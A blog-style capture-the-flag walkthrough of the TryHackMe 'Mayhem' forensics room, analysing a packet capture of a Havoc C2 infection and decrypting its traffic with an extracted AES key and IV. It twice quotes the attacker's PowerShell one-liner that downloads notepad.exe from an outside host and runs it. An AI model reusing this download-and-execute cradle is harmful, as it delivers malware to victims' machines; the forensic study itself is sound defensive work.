Hey everyone, and welcome to another cybersecurity write-up! Today, we're strapping on our detective hats and diving into the [TryHackMe Mayhem room](https://tryhackme.com/room/mayhemroom). The name suggests chaos, and our job is to make sense of it. This room is all about network forensics, so let's get ready to dissect some packets!

---

#### The First Clue: The Pcap File

Our journey begins after unzipping the challenge file. Inside, we find a single, intriguing item: `traffic.pcapng`. A packet capture! This is where all the juicy evidence is hiding.

My first instinct, like any totally normal person, was to peek inside with a text editor. Hey, don't judge! Sometimes you find interesting plaintext right away.

```bash
# Let's see what's inside this mysterious file
nvim traffic.pcapng
```

Before we get too excited, let's do a quick safety check.

```bash
❯ lsz
Permissions Size User   Date Modified Name
.rwxr-xr-x  305k cilgin 15 Nov  2023   traffic.pcapng

~/Downloads via  v3.13.5
❯ chmod -x traffic.pcapng
```

Woah there! The file has execute permissions? That's a huge no-no for a data file. We wouldn't want to accidentally _run_ our packet capture, would we? That could be the shortest investigation ever. Let's defuse this tiny, insignificant bomb by removing that permission. Safety first!

This file is probably from NTFS filesystem.

Opening the file reveals some surprisingly readable text amongst the binary mess:

```text
$aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";$LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;$65lmAtnzW8 = New-Object System.Net.WebClient;$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);Start-Process -Filepath $LA4rJgSPpx



GET /install.ps1 HTTP/1.1
```

Well, well, what do we have here? It looks like our attacker used a PowerShell script (`install.ps1`) to download a file named `notepad.exe`. That seems... incredibly suspicious.

#### Calling in the Big Guns: Wireshark

Reading a `.pcap` file in a text editor is like trying to read a novel through a keyhole. It's time to fire up the proper tool for the job: **Wireshark**.

Using Wireshark's "Export Objects" feature, we can easily extract the `install.ps1` script and the downloaded `notepad.exe` file.

![Desktop View](/assets/img/2025-07-08-TryHackMe-Mayhem/photo1.webp){: width="972" height="589" }

The `install.ps1` script is a nasty one-liner, just like we saw earlier:

```powershell
$aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";$LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;$65lmAtnzW8 = New-Object System.Net.WebClient;$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);Start-Process -Filepath $LA4rJgSPpx
```

Now, about that `notepad.exe`... My malware senses are tingling! Let's send it over to VirusTotal for a second opinion.

[VirusTotal - File - 99784f28e4e95f044d97e402bbf58f369c7c37f49dc5bf48e6b2e706181db3b7](https://www.virustotal.com/gui/file/99784f28e4e95f044d97e402bbf58f369c7c37f49dc5bf48e6b2e706181db3b7)

![Desktop View](/assets/img/2025-07-08-TryHackMe-Mayhem/photo2.webp){: width="972" height="589" }

Bingo! The results are in, and it's lit up like a Christmas tree. VirusTotal confirms our suspicions: this is a malicious payload generated by the **Havoc C2 framework**. Nasty stuff.

[HavocFramework/Havoc: The Havoc Framework](https://github.com/HavocFramework/Havoc)

#### Digging for Strings

VirusTotal is great, but let's do some of our own sleuthing. The `strings` command is a fantastic tool for pulling any readable text out of a binary file. You'd be surprised what secrets you can find.

```bash
# Let's see what secrets this "notepad" is hiding.
strings notepad.exe
```

```text
!This program cannot be run in DOS mode.
...
demon.x64.exe
```

After scrolling through what feels like the entire Matrix, one line near the end jumps out: `demon.x64.exe`. That's not a typo! The Havoc C2 framework uses flagship agent named "Demon". This all but confirms we're on the right track.

#### The Keys to the Kingdom

A bit of research (shoutout to this great [Immersive Labs article](https://www.immersivelabs.com/resources/blog/havoc-c2-framework-a-defensive-operators-guide)!) tells us that Havoc uses a "magic byte" sequence, `0xDEADBEEF`, to mark the start of its encrypted communication setup. It's like a secret knock. If we can find this knock in our packet capture, the keys to the kingdom (or at least, the encryption keys) should be right next to it.

I searched for these magic bytes in Wireshark and found them!

![Desktop View](/assets/img/2025-07-08-TryHackMe-Mayhem/photo3.webp){: width="972" height="589" }

By analyzing the bytes immediately following `0xDEADBEEF`, we can extract the AES key and the IV (Initialization Vector).

```text
AES key: 946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca
IV key:  8cd00c3e349290565aaa5a8c3aacd43
```

#### Cracking the Code with CyberChef

Now that we have our keys, we need the encrypted data. The C2 communication happens over HTTP POST requests. We can use `tshark`, the command-line cousin of Wireshark, to filter our capture and extract just the data from these requests.

```bash
# This command isolates all the POST request media types from the pcap
tshark -r traffic.pcapng -Y 'http.request.method == "POST"' -T fields -e media.type
```

With our encrypted data blobs and our AES/IV keys in hand, we head over to the digital swiss-army-knife for data manipulation: **[CyberChef](https://gchq.github.io/CyberChef/)**.

The recipe is simple:

1.  Input the encrypted data.
2.  Use the "From Hex" operation.
3.  Use the "AES Decrypt" operation, plugging in our extracted Key and IV. Make sure the mode is set to CBC.

![Desktop View](/assets/img/2025-07-08-TryHackMe-Mayhem/photo5.webp){: width="972" height="589" }

_A quick side note: The raw decrypted output was a bit messy, so I used some Vim magic to clean it up for presentation. I could have written a Python script but i wanted do the work myself since there is not that much data._

```bash
# This command isolates all the POST request media types from the pcap
tshark -r traffic.pcapng -Y 'http.request.method == "POST"' -T fields -e media.type | nvim

```

```vim
:%s/00000010deadbeef0e9fb7d80000000100000000/
```

```vim
# And some more to handle the data format
/3a
ctrl-v
select all
n
d
```

#### The Loot: What the Attacker Saw

After decrypting all the POST data blobs, we get a treasure trove of information. The attacker was busy! Here's the some of the data i gained.

Now it's your turn! Decrypt the data and answer the questions.

And there we have it. Hope you enjoyed the walkthrough!
